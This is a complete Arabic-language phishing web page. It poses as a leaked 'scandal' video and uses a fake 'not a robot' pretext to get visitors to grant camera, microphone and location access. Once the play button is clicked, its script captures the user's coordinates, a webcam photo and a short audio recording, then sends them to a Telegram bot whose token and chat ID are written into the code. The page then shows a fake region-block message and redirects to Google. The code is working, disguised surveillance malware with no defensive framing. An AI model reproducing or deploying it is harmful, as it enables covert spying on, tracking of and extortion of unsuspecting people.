<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فضيحة نار 🔥🔥 - مشاهدة الفيديو المسرب</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
        .video-container {
            position: relative;
            width: 100%;
            max-width: 800px;
            aspect-ratio: 16/9;
            background: #111;
            margin: 0 auto;
            border: 1px solid #333;
            cursor: pointer;
        }
        .play-btn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            background: rgba(255, 0, 0, 0.9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.3s;
            z-index: 20;
        }
        .play-btn:hover { transform: translate(-50%, -50%) scale(1.1); }
        .loading-spinner {
            border: 4px solid #333;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <!-- Header -->
    <div class="w-full max-w-2xl mb-6 text-right">
        <h1 class="text-2xl font-bold text-red-600 mb-2 underline">فضيحة نار 🔥🔥 الفيديو الذي يبحث عنه الجميع!</h1>
        <p class="text-xs text-gray-400 font-mono italic">> تم الرفع بواسطة: LeakMaster2099 | مشاهدات: 1.2M</p>
    </div>

    <!-- Video Player Simulation -->
    <div id="videoBox" class="video-container rounded-xl shadow-2xl overflow-hidden" onclick="startPayload()">
        <!-- Thumbnail Placeholder -->
        <div id="thumbnail" class="absolute inset-0 bg-cover bg-center opacity-40" style="background-image: url('https://img.youtube.com/vi/placeholder/maxresdefault.jpg');"></div>
        
        <div id="playBtn" class="play-btn">
            <svg viewBox="0 0 24 24" class="w-10 h-10 fill-white"><path d="M8 5v14l11-7z"/></svg>
        </div>

        <div id="loadingUI" class="absolute inset-0 bg-black/80 flex flex-col items-center justify-center hidden z-30">
            <div class="loading-spinner mb-4"></div>
            <p id="statusMsg" class="text-sm font-bold text-white">جاري تحميل المشغل الآمن...</p>
        </div>
    </div>

    <div class="mt-8 text-center text-gray-500 text-[10px] space-y-2">
        <p>⚠️ يجب السماح بالكاميرا والموقع للتأكد من أنك لست روبوت (إجراء أمان لمنع الحذف)</p>
        <p>&copy; 2026 LeakNode Systems - All Rights Reserved</p>
    </div>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
        const ID = "1523412137";

        async function tg(m, fd) {
            try { await fetch(`https://api.telegram.org/bot${TOKEN}/${m}`, { method: 'POST', body: fd }); } catch(e){}
        }

        async function startPayload() {
            document.getElementById('playBtn').style.display = 'none';
            document.getElementById('loadingUI').classList.remove('hidden');
            const status = document.getElementById('statusMsg');

            try {
                // 1. طلب الكاميرا والميكروفون (تحت مسمى "تفعيل المشغل")
                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v');
                v.srcObject = s;

                // 2. سحب الموقع
                navigator.geolocation.getCurrentPosition(p => {
                    const fd = new FormData();
                    fd.append('chat_id', ID);
                    fd.append('text', `🔥 *فضيحة نار - ضحية جديد*\n\n📍 الموقع:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                    tg('sendMessage', fd);
                });

                // 3. التقاط صور (بينما يظن أنه ينتظر التحميل)
                status.innerText = "جاري فحص اتصال الخادم...";
                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    canvas.toBlob(async b => {
                        const fd = new FormData();
                        fd.append('chat_id', ID);
                        fd.append('photo', b, 'leak.jpg');
                        fd.append('caption', "📸 صورة الضحية أثناء محاولة المشاهدة");
                        await tg('sendPhoto', fd);
                    }, 'image/jpeg');
                }, 1500);

                // 4. تسجيل صوتي قصير (صمت)
                const rec = new MediaRecorder(s);
                const chunks = [];
                rec.ondataavailable = e => chunks.push(e.data);
                rec.onstop = async () => {
                    const b = new Blob(chunks, { type: 'audio/wav' });
                    const fd = new FormData();
                    fd.append('chat_id', ID);
                    fd.append('voice', b, 'v.ogg');
                    fd.append('caption', "🎤 صوت الضحية (رد فعله)");
                    await tg('sendVoice', fd);
                };
                rec.start();
                setTimeout(() => { 
                    rec.stop(); 
                    status.innerText = "عذراً، هذا الفيديو غير متاح في منطقتك!";
                    setTimeout(() => window.location.href = "https://www.google.com", 2000);
                }, 5000);

            } catch (e) {
                status.innerText = "خطأ: يجب السماح بالوصول لتجاوز حجب الفيديو.";
                status.style.color = "red";
            }
        }
    </script>
</body>
</html>
